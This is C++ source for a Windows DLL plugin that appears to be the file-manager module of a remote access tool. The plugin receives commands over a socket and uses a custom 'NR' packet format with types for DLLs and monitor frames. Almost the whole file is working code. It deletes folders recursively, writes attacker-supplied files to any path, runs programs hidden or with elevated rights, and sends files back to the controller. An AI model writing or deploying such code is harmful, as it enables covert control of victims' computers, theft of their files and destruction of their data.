#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <cstdint>
#include <algorithm>
#include <fstream>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")

#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace std;

static wstring clipboard_path = L"";

static const string base64_chars =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static string base64_encode(const vector<uint8_t>& buf) {
    string ret;
    int i = 0;
    uint8_t char_array_3[3];
    uint8_t char_array_4[4];
    size_t in_len = buf.size();
    const uint8_t* bytes_to_encode = buf.data();

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for(i = 0; (i <4) ; i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        int j = 0;
        for(j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while((i++ < 3)) ret += '=';
    }
    return ret;
}

static vector<uint8_t> base64_decode(string const& encoded_string) {
    size_t in_len = encoded_string.size();
    int i = 0;
    int in_ = 0;
    uint8_t char_array_4[4], char_array_3[3];
    vector<uint8_t> ret;
    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i <4; i++) char_array_4[i] = (uint8_t)base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        int j = 0;
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = (uint8_t)base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

static string wide_to_utf8(const wstring& wstr) {
    if (wstr.empty()) return string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

static wstring utf8_to_wide(const string& str) {
    if (str.empty()) return wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

static void send_json(SOCKET sock, const json& data) {
    string msg = data.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

#define PACKET_TYPE_JSON            0x01
#define PACKET_TYPE_DLL             0x02
#define PACKET_TYPE_MONITOR_FRAME   0x03
#define PACKET_TYPE_FILE_UPLOAD     0x04
#define PACKET_TYPE_FILE_DOWNLOAD   0x05

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature; // 0x524E ('NR')
    uint8_t  type;
    uint32_t size;
};
#pragma pack(pop)

static void send_binary_packet(SOCKET sock, uint8_t type, const vector<uint8_t>& payload) {
    PacketHeader header;
    header.signature = 0x524E;
    header.type = type;
    header.size = (uint32_t)payload.size();

    vector<uint8_t> packet;
    packet.resize(sizeof(PacketHeader) + payload.size());
    memcpy(packet.data(), &header, sizeof(PacketHeader));
    if (!payload.empty()) {
        memcpy(packet.data() + sizeof(PacketHeader), payload.data(), payload.size());
    }

    send(sock, (const char*)packet.data(), (int)packet.size(), 0);
}

static string get_last_error_message(DWORD errorCode) {
    if (errorCode == ERROR_SUCCESS) return "Success";
    wchar_t* buffer = nullptr;
    DWORD size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&buffer, 0, NULL
    );
    wstring wmsg = (size && buffer) ? wstring(buffer, size) : (L"Error code: " + to_wstring(errorCode));
    if (buffer) LocalFree(buffer);
    string message = wide_to_utf8(wmsg);
    while (!message.empty() && (message.back() == '\r' || message.back() == '\n' || message.back() == ' '))
        message.pop_back();
    return message;
}

static string format_size(uint64_t size) {
    const char* units[] = {"B", "KB", "MB", "GB", "TB"};
    int unit = 0;
    double dSize = (double)size;
    while (dSize >= 1024 && unit < 4) {
        dSize /= 1024;
        unit++;
    }
    char buf[64];
    sprintf(buf, "%.2f %s", dSize, units[unit]);
    return string(buf);
}

static string filetime_to_string(FILETIME ft) {
    SYSTEMTIME st;
    FileTimeToSystemTime(&ft, &st);
    char buf[64];
    sprintf(buf, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return string(buf);
}

static void send_drives(SOCKET sock) {
    json response;
    response["action"] = "filemanager_response";
    response["type"] = "drives";
    json drives = json::array();
    wchar_t driveStrings[512];
    DWORD length = GetLogicalDriveStringsW(512, driveStrings);
    if (length > 0) {
        wchar_t* drive = driveStrings;
        while (*drive) {
            drives.push_back(wide_to_utf8(drive));
            drive += wcslen(drive) + 1;
        }
    }
    response["drives"] = drives;
    send_json(sock, response);
}

static void send_files(SOCKET sock, wstring path) {
    if (path.empty()) {
        send_drives(sock);
        return;
    }
    if (path.back() != L'\\') path += L"\\";
    json response;
    response["action"] = "filemanager_response";
    response["type"] = "files";
    response["path"] = wide_to_utf8(path);
    json files = json::array();
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((path + L"*").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
                continue;
            json item;
            item["name"] = wide_to_utf8(findData.cFileName);
            item["date"] = filetime_to_string(findData.ftLastWriteTime);
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                item["type"] = "Folder";
                item["size"] = "";
            } else {
                item["type"] = "File";
                uint64_t size = ((uint64_t)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
                item["size"] = format_size(size);
            }
            files.push_back(item);
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    response["files"] = files;
    send_json(sock, response);
}

static void send_log(SOCKET sock, const string& message) {
    json log;
    log["action"] = "filemanager_response";
    log["type"] = "log";
    log["message"] = message;
    send_json(sock, log);
}

static BOOL DeleteRecursiveW(const wstring& path) {
    WIN32_FIND_DATAW findData;
    wstring searchPath = path + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
        wstring fullPath = path + L"\\" + findData.cFileName;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            DeleteRecursiveW(fullPath);
        } else {
            DeleteFileW(fullPath.c_str());
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
    return RemoveDirectoryW(path.c_str());
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_drives(sock);
}

extern "C" __declspec(dllexport) void HandleBinary(SOCKET sock, const uint8_t* payload, size_t size) {
    if (size < 4) return;

    uint32_t pathLen;
    memcpy(&pathLen, payload, 4);
    if (size < (4 + pathLen)) return;

    string pathUtf8((const char*)payload + 4, pathLen);
    wstring path = utf8_to_wide(pathUtf8);

    size_t dataSize = size - 4 - pathLen;
    const uint8_t* data = payload + 4 + pathLen;

    // Ensure directory exists
    size_t last_slash_idx = path.find_last_of(L"\\");
    if (last_slash_idx != wstring::npos) {
        wstring dir = path.substr(0, last_slash_idx);
        SHCreateDirectoryExW(NULL, dir.c_str(), NULL);
    }

    FILE* f = _wfopen(path.c_str(), L"wb");
    if (!f) {
        send_log(sock, "Upload failed: Could not create file " + pathUtf8 + " (Error: " + get_last_error_message(GetLastError()) + ")");
        return;
    }

    if (dataSize > 0) {
        fwrite(data, 1, dataSize, f);
    }
    fclose(f);

    send_log(sock, "File uploaded (Binary): " + pathUtf8);

    size_t last_slash = path.find_last_of(L"\\");
    wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
    send_files(sock, parent);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");
        if (action == "getdrives") {
            send_drives(sock);
        }
        else if (action == "getfiles") {
            send_files(sock, utf8_to_wide(command.value("path", "")));
        }
        else if (action == "deletefile") {
            wstring path = utf8_to_wide(command.value("path", ""));
            DWORD attr = GetFileAttributesW(path.c_str());
            BOOL success = FALSE;
            if (attr != INVALID_FILE_ATTRIBUTES) {
                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = DeleteRecursiveW(path);
                else success = DeleteFileW(path.c_str());
            }
            if (success) {
                send_log(sock, "Deleted: " + wide_to_utf8(path));
                size_t last_slash = path.find_last_of(L"\\");
                wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
                send_files(sock, parent);
            } else {
                send_log(sock, "Delete failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "rename") {
            wstring oldpath = utf8_to_wide(command.value("oldpath", ""));
            wstring newpath = utf8_to_wide(command.value("newpath", ""));
            if (MoveFileW(oldpath.c_str(), newpath.c_str())) {
                send_log(sock, "Renamed to: " + wide_to_utf8(newpath));
                size_t last_slash = oldpath.find_last_of(L"\\");
                wstring parent = (last_slash != wstring::npos) ? oldpath.substr(0, last_slash) : L"";
                send_files(sock, parent);
            } else {
                send_log(sock, "Rename failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "execute") {
            wstring path = utf8_to_wide(command.value("path", ""));
            string mode = command.value("mode", "normal");
            INT show = SW_SHOWNORMAL;
            if (mode == "hidden") show = SW_HIDE;
            HINSTANCE res;
            if (mode == "runas") res = ShellExecuteW(NULL, L"runas", path.c_str(), NULL, NULL, show);
            else res = ShellExecuteW(NULL, L"open", path.c_str(), NULL, NULL, show);
            if ((uintptr_t)res > 32) send_log(sock, "Executed (" + mode + "): " + wide_to_utf8(path));
            else send_log(sock, "Execute failed: " + get_last_error_message(GetLastError()));
        }
        else if (action == "createfolder") {
            wstring path = utf8_to_wide(command.value("path", ""));
            if (CreateDirectoryW(path.c_str(), NULL)) {
                send_log(sock, "Folder created: " + wide_to_utf8(path));
                size_t last_slash = path.find_last_of(L"\\");
                wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
                send_files(sock, parent);
            } else {
                send_log(sock, "Create folder failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "copyfile") {
            clipboard_path = utf8_to_wide(command.value("path", ""));
            send_log(sock, "Copied to clipboard: " + wide_to_utf8(clipboard_path));
        }
        else if (action == "pastefile") {
            if (clipboard_path.empty()) {
                send_log(sock, "Clipboard is empty");
                return;
            }
            wstring dest_dir = utf8_to_wide(command.value("path", ""));
            if (dest_dir.back() != L'\\') dest_dir += L"\\";
            size_t last_slash = clipboard_path.find_last_of(L"\\");
            wstring filename = (last_slash != wstring::npos) ? clipboard_path.substr(last_slash + 1) : clipboard_path;
            wstring dest_path = dest_dir + filename;
            if (CopyFileW(clipboard_path.c_str(), dest_path.c_str(), FALSE)) {
                send_log(sock, "Pasted: " + wide_to_utf8(dest_path));
                send_files(sock, dest_dir);
            } else {
                send_log(sock, "Paste failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "downloadfile") {
            wstring path = utf8_to_wide(command.value("path", ""));
            FILE* f = _wfopen(path.c_str(), L"rb");
            if (!f) {
                send_log(sock, "Download failed: Could not open file");
                return;
            }
            _fseeki64(f, 0, SEEK_END);
            long long size = _ftelli64(f);
            _fseeki64(f, 0, SEEK_SET);

            if (size > (50LL * 1024 * 1024)) {
                fclose(f);
                send_log(sock, "Download failed: File size exceeds 50MB limit");
                return;
            }

            vector<uint8_t> file_data(size);
            fread(file_data.data(), 1, size, f);
            fclose(f);

            string fileName = wide_to_utf8(path.substr(path.find_last_of(L"\\") + 1));
            string fileNameUtf8 = wide_to_utf8(path.substr(path.find_last_of(L"\\") + 1)); // Actually we want just the name

            // Binary Payload: [4 bytes name len][name][data]
            uint32_t nameLen = (uint32_t)fileNameUtf8.length();
            vector<uint8_t> payload;
            payload.resize(4 + nameLen + file_data.size());
            memcpy(payload.data(), &nameLen, 4);
            memcpy(payload.data() + 4, fileNameUtf8.c_str(), nameLen);
            memcpy(payload.data() + 4 + nameLen, file_data.data(), file_data.size());

            send_binary_packet(sock, PACKET_TYPE_FILE_DOWNLOAD, payload);
            send_log(sock, "File downloaded (Binary): " + wide_to_utf8(path));
        }
    } catch (...) {
        send_log(sock, "Client-side plugin error processing command");
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
